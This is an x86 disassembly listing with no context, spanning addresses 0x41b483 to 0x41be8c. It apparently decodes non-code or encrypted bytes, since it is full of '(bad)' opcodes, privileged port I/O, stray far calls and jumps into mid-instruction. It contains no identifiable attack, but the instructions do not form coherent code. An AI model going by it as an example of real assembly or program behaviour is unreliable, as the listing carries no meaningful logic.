  41b483:	cmp    dl,BYTE PTR [edi]
  41b485:	xchg   edx,eax
  41b486:	mov    edx,0x5b44ca0c
  41b48b:	leave  
  41b48c:	xor    eax,0xe800810f
  41b491:	cmp    esi,DWORD PTR [edx+0x44]
  41b494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b495:	in     eax,dx
  41b496:	jae    0x41b46c
  41b498:	push   esi
  41b499:	test   BYTE PTR [esp+eiz*2+0x6c7a0918],cl
  41b4a0:	jne    0x41b467
  41b4a2:	inc    edi
  41b4a3:	or     al,BYTE PTR [ecx+edi*4]
  41b4a6:	sbb    ecx,ecx
  41b4a8:	rol    dh,1
  41b4aa:	sub    DWORD PTR [esi+edx*2+0x7e],edi
  41b4ae:	arpl   WORD PTR [edi-0x75],di
  41b4b1:	loop   0x41b475
  41b4b3:	stos   BYTE PTR es:[edi],al
  41b4b4:	jg     0x41b531
  41b4b6:	repz rol BYTE PTR ds:0xd3849a32,1
  41b4bd:	push   0x1c
  41b4bf:	xor    esp,eax
  41b4c1:	inc    edi
  41b4c2:	das    
  41b4c3:	out    dx,eax
  41b4c4:	dec    ebp
  41b4c5:	xchg   esp,eax
  41b4c6:	leave  
  41b4c7:	(bad)  [edx+0x35]
  41b4ca:	jmp    0x41b45f
  41b4cc:	jg     0x41b474
  41b4ce:	pop    ebx
  41b4cf:	ins    DWORD PTR es:[edi],dx
  41b4d0:	inc    edx
  41b4d1:	js     0x41b52c
  41b4d3:	jo     0x41b47e
  41b4d5:	out    0xb,al
  41b4d7:	stos   BYTE PTR es:[edi],al
  41b4d8:	mov    eax,ds:0xaa4538da
  41b4dd:	jne    0x41b528
  41b4df:	je     0x41b4c5
  41b4e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4e2:	fiadd  DWORD PTR [ecx+0x12e4dc33]
  41b4e8:	sbb    al,0x99
  41b4ea:	into   
  41b4eb:	inc    esi
  41b4ec:	jno    0x41b4b8
  41b4ee:	pop    esi
  41b4ef:	sbb    BYTE PTR [ebx-0x5fc581b3],al
  41b4f5:	pop    esp
  41b4f6:	or     edx,ebx
  41b4f8:	or     edi,DWORD PTR [ebx+esi*2]
  41b4fb:	arpl   di,bx
  41b4fd:	(bad)  
  41b4fe:	out    0x81,al
  41b500:	pusha  
  41b501:	lea    esi,ds:0xbabc489f
  41b507:	shl    DWORD PTR [ebp-0x42d3796a],cl
  41b50d:	pop    esi
  41b50e:	rol    dh,1
	...
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b581:	lock inc edi
  41b583:	adc    al,0x18
  41b585:	and    al,BYTE PTR [ecx]
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b58d:	test   al,0x6a
  41b58f:	or     ebx,edi
  41b591:	add    eax,0x5b34c0a6
  41b596:	add    al,0xa5
  41b598:	dec    eax
  41b599:	inc    ebp
  41b59a:	mov    esp,0xedad37ec
  41b59f:	test   eax,0x47e60d9c
  41b5a4:	pusha  
  41b5a5:	popa   
  41b5a6:	lods   al,BYTE PTR gs:[esi]
  41b5a8:	in     eax,dx
  41b5a9:	push   esi
  41b5aa:	pop    ds
  41b5ab:	sub    dl,bl
  41b5ad:	sbb    BYTE PTR [ecx-0x4f852382],0x2b
  41b5b4:	ds dec edi
  41b5b6:	mov    BYTE PTR [eax+0x4a],0xcf
  41b5ba:	jl     0x41b564
  41b5bc:	test   al,0x35
  41b5be:	sahf   
  41b5bf:	mov    bh,0x59
  41b5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5c2:	inc    edx
  41b5c3:	mov    edi,0x581a95d2
  41b5c8:	into   
  41b5c9:	sbb    esp,eax
  41b5cb:	push   ds
  41b5cc:	(bad)
  41b5cf:	jb     0x41b5f7
  41b5d1:	adc    al,0xc1
  41b5d3:	and    edx,DWORD PTR [eax+0xe284f41]
  41b5d9:	push   ss
  41b5da:	pop    es
  41b5db:	mov    esp,ebx
  41b5dd:	loop   0x41b5c4
  41b5df:	mov    al,ds:0x41625ca4
  41b5e4:	mul    DWORD PTR [esi]
  41b5e6:	pop    edi
  41b5e7:	adc    DWORD PTR [ebx+0x13391749],ecx
  41b5ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ee:	(bad)  
  41b5ef:	sbb    eax,0xbda16ad3
  41b5f4:	lods   al,BYTE PTR ds:[esi]
  41b5f5:	rcl    BYTE PTR [esi+edx*2+0x2b],0xff
  41b5fa:	out    0x50,eax
  41b5fc:	mov    gs,WORD PTR [esi-0x5f539e51]
  41b602:	jge    0x41b632
  41b604:	pusha  
  41b605:	jp     0x41b5fe
  41b607:	dec    esp
  41b608:	fiadd  DWORD PTR [edi-0x4f]
  41b60b:	fcmove st,st(3)
  41b60d:	imul   eax,edi,0x42
  41b610:	cmc    
  41b611:	mov    ebx,DWORD PTR [esi+edx*1+0x11]
  41b615:	jb     0x41b60e
  41b617:	inc    esi
  41b618:	ret    
  41b619:	inc    ebx
  41b61a:	in     eax,dx
  41b61b:	fs daa 
  41b61d:	fsubrp st(4),st
  41b61f:	hlt    
  41b620:	pop    esi
  41b621:	inc    ecx
  41b622:	or     DWORD PTR [ebx-0x19c40d2a],0x1b
  41b629:	xchg   esp,eax
  41b62a:	ja     0x41b5ee
  41b62c:	(bad)  
  41b62d:	xor    ch,BYTE PTR [ebx+0x48]
  41b630:	mul    DWORD PTR [ecx+ebx*8]
  41b633:	je     0x41b5ed
  41b635:	jne    0x41b62e
  41b637:	les    ecx,FWORD PTR [edi]
  41b639:	call   0xdd35:0x819b4e8
  41b640:	jns    0x41b63c
  41b642:	test   DWORD PTR [eax],0xee56ba44
  41b648:	lods   eax,DWORD PTR ds:[esi]
  41b649:	xor    BYTE PTR [edi-0x4fb01963],0x8c
  41b650:	inc    esp
  41b651:	retf   
  41b652:	call   0x5cab:0x4b851416
  41b659:	repnz dec esp
  41b65b:	and    ebp,DWORD PTR [edx]
  41b65d:	shl    BYTE PTR ds:0xf3f01f18,cl
  41b663:	dec    ebx
  41b664:	out    dx,eax
  41b665:	mov    ebp,0x3176bd23
  41b66a:	push   ds
  41b66b:	imul   ecx,esp,0x6f
  41b66e:	fidivr DWORD PTR gs:[ebp-0x773195a1]
  41b675:	stc    
  41b676:	sti    
  41b677:	mov    ebp,0x3ff31d45
  41b67c:	and    esi,DWORD PTR [esi+0x62]
  41b67f:	mov    edi,0x956e342a
  41b684:	and    eax,0xcaec0c7
  41b689:	out    dx,eax
  41b68a:	ss out 0xa8,al
  41b68d:	stc    
  41b68e:	xchg   ebp,eax
  41b68f:	jle    0x41b691
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	mov    ch,0x68
  41b702:	out    dx,eax
  41b703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b704:	sbb    al,0x23
  41b706:	add    DWORD PTR [eax],eax
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	lods   al,BYTE PTR ds:[esi]
  41b70d:	lahf   
  41b70e:	fild   DWORD PTR [ecx-0x1e]
  41b711:	or     eax,0x95e28cc0
  41b716:	aas    
  41b717:	in     eax,dx
  41b718:	retf   
  41b719:	daa    
  41b71a:	jle    0x41b773
  41b71c:	shl    BYTE PTR [ecx+0x57],1
  41b71f:	leave  
  41b720:	in     al,0x8c
  41b722:	fcmovbe st,st(1)
  41b724:	and    BYTE PTR [edx+0x50],al
  41b727:	dec    ecx
  41b728:	inc    edi
  41b729:	(bad)  [edi-0x5e87d0f7]
  41b72f:	inc    ebp
  41b730:	(bad)  
  41b731:	dec    ecx
  41b732:	push   ds
  41b733:	cli    
  41b734:	imul   esp,DWORD PTR [edx],0x2
  41b737:	jmp    DWORD PTR [esi-0x2b6cac39]
  41b73d:	jmp    0x5a2:0x8ccbe609
  41b744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b745:	fnstsw WORD PTR [ebx+0x18b3c078]
  41b74b:	lea    edx,ds:0x279c9021
  41b751:	test   al,0x86
  41b753:	rol    DWORD PTR [edx+0x68fbec71],cl
  41b759:	add    dh,BYTE PTR [ebx-0x60]
  41b75c:	arpl   WORD PTR [esi-0x1decf7df],bx
  41b762:	or     dl,BYTE PTR [edx-0x2e]
  41b765:	shr    BYTE PTR [edx+0x3d],1
  41b768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b769:	pop    es
  41b76a:	into   
  41b76b:	or     eax,0x8ddab89a
  41b770:	add    BYTE PTR [edx],0xaa
  41b773:	and    BYTE PTR [ebx-0x52],bh
  41b776:	sti    
  41b777:	add    DWORD PTR [ecx-0x13],esp
  41b77a:	xor    al,BYTE PTR ds:0x6d4f2c35
  41b780:	xchg   ebx,eax
  41b781:	arpl   WORD PTR [eax+0x1886125f],sp
  41b787:	movlps QWORD PTR [eax],xmm6
  41b78a:	or     al,BYTE PTR [edx]
  41b78c:	push   edx
  41b78d:	enter  0x916b,0xa
  41b791:	cdq    
  41b792:	fisub  WORD PTR [eax-0x2e3a8bb0]
  41b798:	sbb    eax,DWORD PTR [esi+0x4]
  41b79b:	sbb    al,0x73
  41b79d:	mul    BYTE PTR [ebp-0x6e60291f]
  41b7a3:	mov    esi,0xc19344a
  41b7a8:	inc    edi
  41b7a9:	mov    ebx,0xba33a10c
  41b7ae:	es daa 
  41b7b0:	jp     0x41b818
  41b7b2:	mov    edi,0x54870edd
  41b7b7:	adc    al,0x81
  41b7b9:	dec    edx
  41b7ba:	cmc    
  41b7bb:	or     al,0x91
  41b7bd:	scas   al,BYTE PTR es:[edi]
  41b7be:	sbb    eax,0x64da3f3
  41b7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7c4:	call   0x6a36:0x8e066c2b
  41b7cb:	cmp    esi,edx
  41b7cd:	and    dl,BYTE PTR [edi+0x48f8d467]
  41b7d3:	cmc    
  41b7d4:	and    BYTE PTR [esp+ebp*1-0x1d],bh
  41b7d8:	into   
  41b7d9:	shl    BYTE PTR [esi-0x1715a755],1
  41b7df:	aaa    
  41b7e0:	dec    esi
  41b7e1:	test   edi,esp
  41b7e3:	scas   al,BYTE PTR es:[edi]
  41b7e4:	je     0x41b854
  41b7e6:	dec    esi
  41b7e7:	inc    esi
  41b7e8:	pop    ds
  41b7e9:	and    dl,al
  41b7eb:	pop    ebp
  41b7ec:	in     eax,dx
  41b7ed:	inc    edx
  41b7ee:	mov    ebp,0x381c23d
  41b7f3:	adc    bh,BYTE PTR [edi-0x37ba9f17]
  41b7f9:	push   eax
  41b7fa:	jbe    0x41b858
  41b7fc:	push   es
  41b7fd:	sub    esp,DWORD PTR [edx]
  41b7ff:	pop    eax
  41b800:	sbb    BYTE PTR ds:0x720a4e89,0xc1
  41b807:	scas   eax,DWORD PTR es:[edi]
  41b808:	jae    0x41b7dc
  41b80a:	clc    
  41b80b:	bound  edx,QWORD PTR ds:0x3ae62a
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x51
  41b881:	push   0x24205fc9
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    al,0x1
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	mov    ebp,0x173b619b
  41b891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b892:	mov    ah,BYTE PTR [esi-0x5c0efab6]
  41b898:	sbb    ebp,DWORD PTR [edi]
  41b89a:	dec    esi
  41b89b:	hlt    
  41b89c:	sub    BYTE PTR [esi+eax*1-0x9],al
  41b8a0:	icebp  
  41b8a1:	mov    eax,ds:0x3b4707bb
  41b8a6:	shr    DWORD PTR ds:0xcf0d756c,1
  41b8ac:	rol    DWORD PTR [edi+eax*8+0x19ec75bb],cl
  41b8b3:	mov    ebx,0x795f6734
  41b8b8:	mov    ebx,0xd88ea6a
  41b8bd:	mov    esp,0xac4f288e
  41b8c2:	dec    edi
  41b8c3:	mov    ebp,0x7e7642cf
  41b8c8:	loope  0x41b8b5
  41b8ca:	nop
  41b8cb:	in     eax,dx
  41b8cc:	inc    ebx
  41b8cd:	retf   0xd3d7
  41b8d0:	inc    ebx
  41b8d1:	js     0x41b90e
  41b8d3:	retf   
  41b8d4:	cmp    edx,DWORD PTR [esi+0x5a1b3e9f]
  41b8da:	mov    cs,WORD PTR [ecx+0x15]
  41b8dd:	aad    0x33
  41b8df:	inc    edx
  41b8e0:	fnstenv [ebx+0x2b]
  41b8e3:	imul   DWORD PTR [ebx+0x59b68b4c]
  41b8e9:	fiadd  DWORD PTR [ebp-0x5593ec6]
  41b8ef:	scas   eax,DWORD PTR es:[edi]
  41b8f0:	adc    ch,al
  41b8f2:	xchg   ebx,eax
  41b8f3:	fs push edi
  41b8f5:	xchg   edi,eax
  41b8f6:	rcr    DWORD PTR [edi-0x670fa406],cl
  41b8fc:	adc    edi,DWORD PTR [edx-0x4ddc3780]
  41b902:	jno    0x41b97e
  41b904:	mov    edx,0x72a0d684
  41b909:	mov    bh,0xa5
  41b90b:	cmp    ah,BYTE PTR [edi-0xae72b95]
  41b911:	xchg   edx,eax
  41b912:	mov    dl,0x64
  41b914:	loopne 0x41b935
  41b916:	aaa    
  41b917:	repz icebp 
  41b919:	cmp    DWORD PTR [ebx-0x2b],eax
  41b91c:	lock sbb ecx,DWORD PTR [edi-0x2]
  41b920:	ds ret 0xfb3b
  41b924:	pop    es
  41b925:	popf   
  41b926:	mov    BYTE PTR [eax-0x363f788d],0x23
  41b92d:	icebp  
  41b92e:	mov    ch,BYTE PTR [esi]
  41b930:	xor    BYTE PTR [ebx+0x76],0xde
  41b934:	dec    edi
  41b935:	call   0x70ee:0x18c25c6
  41b93c:	mov    edx,0x20f34cb6
  41b941:	inc    ebx
  41b942:	scas   eax,DWORD PTR es:[edi]
  41b943:	mov    ebp,0x7629fcc9
  41b948:	sar    ebx,cl
  41b94a:	fnstenv ds:0x823456fd
  41b950:	jmp    0x41b8d2
  41b952:	inc    edx
  41b953:	sub    al,0xc6
  41b955:	pop    ds
  41b956:	ret    0x3dc
  41b959:	push   esp
  41b95a:	retf   
  41b95b:	inc    edx
  41b95c:	mov    bl,0x1b
  41b95e:	xchg   esi,eax
  41b95f:	add    BYTE PTR [edx+0x63],al
  41b962:	addr16 pop ebx
  41b964:	mov    al,0x7d
  41b966:	(bad)  
  41b968:	not    esi
  41b96a:	js     0x41b906
  41b96c:	mov    bl,0xeb
  41b96e:	mov    al,0x2f
  41b970:	pop    ds
  41b971:	push   0x8ea6af66
  41b976:	mov    ah,0x72
  41b978:	into   
  41b979:	sub    BYTE PTR [ecx],bh
  41b97b:	ins    BYTE PTR es:[edi],dx
  41b97c:	mov    ds:0x38a883fe,eax
  41b981:	dec    edi
  41b982:	xor    BYTE PTR [esi+edx*8],al
  41b985:	push   eax
  41b986:	mov    BYTE PTR [edi+0x4a62b10a],ah
  41b98c:	adc    al,al
  41b98e:	adc    eax,0x7d
	...
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	dec    esi
  41ba01:	das    
  41ba02:	pop    eax
  41ba03:	fbld   TBYTE PTR [eiz*1+0x1040001]
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	test   DWORD PTR [ebx+0x7c9df4fb],edx
  41ba12:	or     eax,0x7bdb7f53
  41ba17:	or     cl,ch
  41ba19:	fist   WORD PTR [edx-0x67597a13]
  41ba1f:	xchg   esp,esp
  41ba21:	dec    ebx
  41ba22:	inc    esi
  41ba23:	mov    al,ds:0x2d8698fc
  41ba28:	jb     0x41ba7e
  41ba2a:	retf   
  41ba2b:	xchg   edx,eax
  41ba2c:	call   0xcae9:0xb21a0abd
  41ba33:	ret    
  41ba34:	iret   
  41ba35:	mov    WORD PTR [ecx+0x74],?
  41ba38:	lock pushf 
  41ba3a:	push   0x6d053ffe
  41ba3f:	repz adc cl,ch
  41ba42:	sub    BYTE PTR [ebx-0x295c433b],al
  41ba48:	mov    ebp,0xd954dc1d
  41ba4d:	push   esp
  41ba4e:	(bad)  
  41ba50:	add    eax,0x44d2cb47
  41ba55:	cmp    al,0x11
  41ba57:	ja     0x41babf
  41ba59:	fsub   DWORD PTR ds:0x49478ded
  41ba5f:	mov    ebp,DWORD PTR [eax]
  41ba61:	je     0x41ba0a
  41ba63:	lods   eax,DWORD PTR ds:[esi]
  41ba64:	test   BYTE PTR [ebx+0x8622fa0],0xdc
  41ba6b:	pushw  es
  41ba6d:	sbb    ebp,esp
  41ba6f:	cmp    DWORD PTR [ecx],0xffffffb7
  41ba72:	push   cs
  41ba73:	inc    esi
  41ba74:	arpl   sp,di
  41ba76:	add    ebp,DWORD PTR [esi+0x29]
  41ba79:	push   edi
  41ba7a:	outs   dx,DWORD PTR ds:[esi]
  41ba7b:	adc    BYTE PTR [ecx+edi*8],bl
  41ba7e:	lahf   
  41ba7f:	cmp    eax,esi
  41ba81:	mov    cl,0x63
  41ba83:	and    al,0xe3
  41ba85:	inc    esp
  41ba86:	repz aas 
  41ba88:	sbb    ebp,DWORD PTR [eax-0x2b]
  41ba8b:	mov    bh,BYTE PTR [edi+0x71]
  41ba8e:	clc    
  41ba8f:	xchg   ebp,eax
  41ba90:	lods   al,BYTE PTR ds:[esi]
  41ba91:	rol    esi,cl
  41ba93:	xchg   ebp,eax
  41ba94:	sbb    al,0x26
  41ba96:	push   edi
  41ba97:	leave  
  41ba98:	or     DWORD PTR [ecx],esi
  41ba9a:	leave  
  41ba9b:	retf   
  41ba9c:	xlat   BYTE PTR ds:[ebx]
  41ba9d:	int3   
  41ba9e:	inc    ebx
  41ba9f:	sub    eax,0xde618571
  41baa4:	in     eax,dx
  41baa5:	sub    al,0x50
  41baa7:	call   0xcad2c610
  41baac:	mov    ebx,0xb50dfb70
  41bab1:	retf   
  41bab2:	jbe    0x41ba40
  41bab4:	fmul   QWORD PTR [ebx]
  41bab6:	and    DWORD PTR [ebp-0xf],eax
  41bab9:	add    eax,0x47490336
  41babe:	dec    ebx
  41babf:	mov    cl,0x34
  41bac1:	daa    
  41bac2:	cmc    
  41bac3:	lods   al,BYTE PTR ds:[esi]
  41bac4:	(bad)  
  41bac5:	(bad)  
  41bac6:	stos   DWORD PTR es:[edi],eax
  41bac7:	popf   
  41bac8:	imul   edx,DWORD PTR ds:[esi+edi*4+0x24b7c895],0xafb3a894
  41bad4:	sub    eax,0x9ca6d9b3
  41bad9:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41badb:	and    eax,0xabb32c2e
  41bae0:	xor    BYTE PTR [ecx+0x1a],dl
  41bae3:	mov    ds:0x10d70450,eax
  41bae8:	cwde   
  41bae9:	lds    eax,FWORD PTR [ebx-0x28279f00]
  41baef:	mov    BYTE PTR [edi+0x6b597c54],dl
  41baf5:	mov    edi,0x10f76f8a
  41bafa:	adc    bh,dl
  41bafc:	xchg   esi,eax
  41bafd:	inc    eax
  41bafe:	stc    
  41baff:	jae    0x41bad3
  41bb01:	xor    al,0x3d
  41bb03:	sbb    ch,BYTE PTR [eax]
  41bb05:	shl    DWORD PTR [edi+0x68],cl
  41bb08:	in     al,0xf6
  41bb0a:	popa   
  41bb0b:	out    0x54,al
  41bb0d:	aad    0x20
  41bb0f:	dec    esi
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x27],cx
  41bb81:	and    al,0xe9
  41bb83:	pushf  
  41bb84:	sub    BYTE PTR [esi],ah
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	mov    al,0x75
  41bb8e:	loope  0x41bb7b
  41bb90:	xchg   ecx,eax
  41bb91:	jo     0x41bbdf
  41bb93:	js     0x41bb89
  41bb95:	cmp    eax,0x2b86c970
  41bb9a:	das    
  41bb9b:	sub    eax,0x37e163ce
  41bba0:	(bad)  
  41bba1:	in     eax,dx
  41bba2:	outs   dx,BYTE PTR ds:[esi]
  41bba3:	out    dx,al
  41bba4:	adc    ecx,esp
  41bba6:	outs   dx,BYTE PTR ds:[esi]
  41bba7:	out    dx,eax
  41bba8:	test   al,0x19
  41bbaa:	push   esp
  41bbab:	out    0x70,eax
  41bbad:	repz xchg dh,dl
  41bbb0:	test   eax,0x7a8b68a4
  41bbb5:	int3   
  41bbb6:	xchg   esp,eax
  41bbb7:	adc    al,0xe
  41bbb9:	fild   WORD PTR [ecx]
  41bbbb:	cmc    
  41bbbc:	push   ebp
  41bbbd:	call   0x9013:0x4efb66d0
  41bbc4:	ss out 0xdb,al
  41bbc7:	mov    esp,0x883ed5a7
  41bbcc:	pop    ebp
  41bbcd:	dec    ebx
  41bbce:	sbb    al,0x5b
  41bbd0:	mov    edi,ebx
  41bbd2:	pop    ebx
  41bbd3:	pop    edx
  41bbd4:	push   esi
  41bbd5:	sahf   
  41bbd6:	or     eax,esi
  41bbd8:	push   ecx
  41bbd9:	call   0x2a06bcdd
  41bbde:	push   ebx
  41bbdf:	ret    
  41bbe0:	mov    al,0xe0
  41bbe2:	push   es
  41bbe3:	sbb    eax,0x309467a8
  41bbe8:	lock lock in al,0x8c
  41bbec:	dec    ecx
  41bbed:	xchg   edi,eax
  41bbee:	scas   eax,DWORD PTR es:[edi]
  41bbef:	out    0x52,eax
  41bbf1:	sbb    DWORD PTR [ebp-0xb],esi
  41bbf4:	lods   eax,DWORD PTR ds:[esi]
  41bbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf6:	push   ds
  41bbf7:	push   ebx
  41bbf8:	data16 mov bh,0x4f
  41bbfb:	mov    dh,0x85
  41bbfd:	rol    DWORD PTR [ebp+0x6a7976],0x24
  41bc04:	dec    edi
  41bc05:	push   ds
  41bc06:	bound  esi,QWORD PTR [edi+0x7c4d3dc4]
  41bc0c:	and    bl,BYTE PTR [ecx-0x2]
  41bc0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc10:	bound  edx,QWORD PTR [bx-0x73]
  41bc14:	and    al,0x5e
  41bc16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc17:	push   0xffffffae
  41bc19:	fs aad 0x3d
  41bc1c:	repz cmp al,0xf9
  41bc1f:	das    
  41bc20:	add    ebx,DWORD PTR [edx]
  41bc22:	adc    edx,DWORD PTR [esi+0x50]
  41bc25:	icebp  
  41bc26:	outs   dx,BYTE PTR ds:[esi]
  41bc27:	xchg   esp,eax
  41bc28:	pop    ebx
  41bc29:	loope  0x41bc90
  41bc2b:	or     al,0xbf
  41bc2d:	cmc    
  41bc2e:	in     al,dx
  41bc2f:	dec    esi
  41bc30:	lahf   
  41bc31:	outs   dx,BYTE PTR ds:[esi]
  41bc32:	push   es
  41bc33:	dec    edx
  41bc34:	stos   DWORD PTR es:[edi],eax
  41bc35:	push   ecx
  41bc36:	pop    ds
  41bc37:	out    0xfe,al
  41bc39:	sbb    DWORD PTR [eax+0x39],esi
  41bc3c:	or     al,0x9b
  41bc3e:	pop    esp
  41bc3f:	js     0x41bc07
  41bc41:	in     eax,0xcd
  41bc43:	test   al,al
  41bc45:	mov    ds:0x533fb674,eax
  41bc4a:	das    
  41bc4b:	adc    eax,0x9922c6e7
  41bc50:	clc    
  41bc51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc52:	das    
  41bc53:	or     BYTE PTR [edi-0xb15fe73],ch
  41bc59:	jae    0x41bc7d
  41bc5b:	sub    ch,BYTE PTR [edi+0x266b8fbc]
  41bc61:	into   
  41bc62:	and    eax,0x390bc351
  41bc67:	jmp    0x3f71:0x61544f41
  41bc6e:	add    BYTE PTR [ecx+0x3bd7bb8b],cl
  41bc74:	mov    dl,0x24
  41bc76:	mov    dl,0xf9
  41bc78:	push   ds
  41bc79:	sbb    eax,0x4ddb9de6
  41bc7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc7f:	iret   
  41bc80:	xchg   ebx,eax
  41bc81:	mov    gs,WORD PTR [ebp+0xf669b0e]
  41bc87:	mov    eax,ds:0xf5f06fd2
  41bc8c:	mov    ah,0x9e
  41bc8e:	ror    BYTE PTR [ecx],1
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x17d3d9d8
  41bd02:	add    esp,DWORD PTR [edx+0x1272c]
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	jbe    0x41bc9d
  41bd0e:	lods   al,BYTE PTR ds:[esi]
  41bd0f:	push   ds
  41bd10:	jbe    0x41bd21
  41bd12:	cwde   
  41bd13:	hlt    
  41bd14:	xor    dl,BYTE PTR [esi-0x7b4e480d]
  41bd1a:	mov    ds:0x719527d6,eax
  41bd1f:	scas   al,BYTE PTR es:[edi]
  41bd20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd21:	loop   0x41bd79
  41bd23:	sbb    BYTE PTR ds:0x7d978e14,al
  41bd29:	setl   BYTE PTR [edi-0x4b]
  41bd2d:	imul   ecx,DWORD PTR [ecx+ebp*1-0x1201f354],0xaee5d02e
  41bd38:	gs stos DWORD PTR es:[edi],eax
  41bd3a:	or     BYTE PTR ds:0x176e0ab6,bl
  41bd40:	loop   0x41bce5
  41bd42:	fdivp  st(3),st
  41bd44:	in     al,0xa
  41bd46:	or     DWORD PTR [edi],edx
  41bd48:	cld    
  41bd49:	in     eax,dx
  41bd4a:	imul   BYTE PTR ss:[ecx-0x26a1765]
  41bd51:	iret   
  41bd52:	call   0xab9a5d
  41bd57:	push   edx
  41bd58:	mov    eax,ds:0x7dbfb983
  41bd5d:	or     BYTE PTR [edi-0x49317570],0xcc
  41bd64:	sub    eax,0x332b9b65
  41bd69:	mov    esi,0xbd941107
  41bd6e:	or     eax,0x3c6c7529
  41bd73:	ret    
  41bd74:	fs out dx,eax
  41bd76:	in     eax,0x1f
  41bd78:	sbb    bh,BYTE PTR [ecx-0x5d]
  41bd7b:	sub    eax,DWORD PTR [ecx-0x3f186df8]
  41bd81:	aaa    
  41bd82:	mov    dh,0x19
  41bd84:	sti    
  41bd85:	sbb    edi,DWORD PTR [ebx+0xd]
  41bd88:	jp     0x41bdad
  41bd8a:	jmp    0x94b0c4b6
  41bd8f:	dec    edx
  41bd90:	gs out dx,eax
  41bd92:	out    0x80,eax
  41bd94:	add    bh,0xda
  41bd97:	push   cs
  41bd98:	retf   
  41bd99:	jg     0x41bdcb
  41bd9b:	cwde   
  41bd9c:	push   edi
  41bd9d:	shr    DWORD PTR [esi],cl
  41bd9f:	xor    eax,0xf037889d
  41bda4:	in     eax,0x4d
  41bda6:	aas    
  41bda7:	in     al,0x47
  41bda9:	lea    ebx,[edi]
  41bdab:	cs call 0x40991166
  41bdb1:	leave  
  41bdb2:	pushf  
  41bdb3:	popa   
  41bdb4:	push   es
  41bdb5:	repz (bad) 
  41bdb7:	push   esi
  41bdb8:	enter  0x104e,0xfd
  41bdbc:	aas    
  41bdbd:	aaa    
  41bdbe:	imul   eax,DWORD PTR [edx-0x3ae00ee3],0xffffffaa
  41bdc5:	dec    esi
  41bdc6:	es mov bl,0xb2
  41bdc9:	xchg   ebp,ecx
  41bdcb:	test   BYTE PTR [ecx+0x51],dh
  41bdce:	outs   dx,BYTE PTR ds:[esi]
  41bdcf:	pop    ds
  41bdd0:	dec    edx
  41bdd1:	pop    esi
  41bdd2:	repz retf 0x5da3
  41bdd6:	test   BYTE PTR [ebx-0x4ad6b15],bl
  41bddc:	repz sti 
  41bdde:	mov    al,ds:0x968e3c52
  41bde3:	pushf  
  41bde4:	xchg   ecx,eax
  41bde5:	fdiv   QWORD PTR [ecx+0x3]
  41bde8:	loope  0x41bd7e
  41bdea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdeb:	or     ch,dl
  41bded:	imul   esp,DWORD PTR [ecx],0x6e4cb39f
  41bdf3:	imul   edi,DWORD PTR [edi],0xaf0a85b5
  41bdf9:	fld    TBYTE PTR [edx+0x7e]
  41bdfc:	enter  0x1a38,0xe5
  41be00:	cdq    
  41be01:	sub    esp,edi
  41be03:	xor    BYTE PTR [esi+eiz*2-0x70],al
  41be07:	xchg   esi,eax
  41be08:	int    0x63
  41be0a:	(bad)  
  41be0b:	imul   DWORD PTR [edi+0x60]
  41be0e:	push   es
  41be0f:	xor    eax,0x0
	...
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx+0x36ea3f66]
  41be82:	pushf  
  41be83:	int    0x30
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR [ecx+eax*1],al
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	push   ebp
